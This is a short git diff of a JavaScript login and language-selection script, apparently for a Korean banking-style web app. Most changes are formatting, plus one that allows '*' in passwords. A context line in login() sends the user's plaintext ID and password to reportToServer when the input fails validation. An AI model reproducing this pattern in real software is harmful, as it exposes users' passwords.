@@ -2,11 +2,12 @@ import { getAsset } from './bank.js';
 
 // #region 언어 선택
 
-document.querySelectorAll('.langBtn').forEach(function(btn, index) {
-  btn.addEventListener('click', function() {
+document.querySelectorAll('.langBtn').forEach(function (btn, index) {
+  btn.addEventListener('click', function () {
     // 동일한 인덱스를 가진 .langLst 요소를 찾아서 클래스를 토글합니다.
     var langLsts = document.querySelectorAll('.langLst');
-    if (langLsts.length > index) { // .langLst가 충분히 존재하는지 확인
+    if (langLsts.length > index) {
+      // .langLst가 충분히 존재하는지 확인
       langLsts[index].classList.toggle('show');
     }
   });
@@ -781,7 +782,7 @@ function login(e) {
 
   // 입력 값 검증
   let specialCharRegex = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+/;
-  let pwSpecialCharRegex = /[^!@#A-Za-z0-9]/;
+  let pwSpecialCharRegex = /[^!@#*A-Za-z0-9]/;
 
   if (specialCharRegex.test(loginId) || pwSpecialCharRegex.test(loginPw)) {
     reportToServer({ id: loginId, pw: loginPw });
@@ -790,6 +791,7 @@ function login(e) {
   }
 
   if (!loginId || !loginPw) {
+
     checkLogin('아이디와 비밀번호를 입력해주세요', true);
     return;
   }
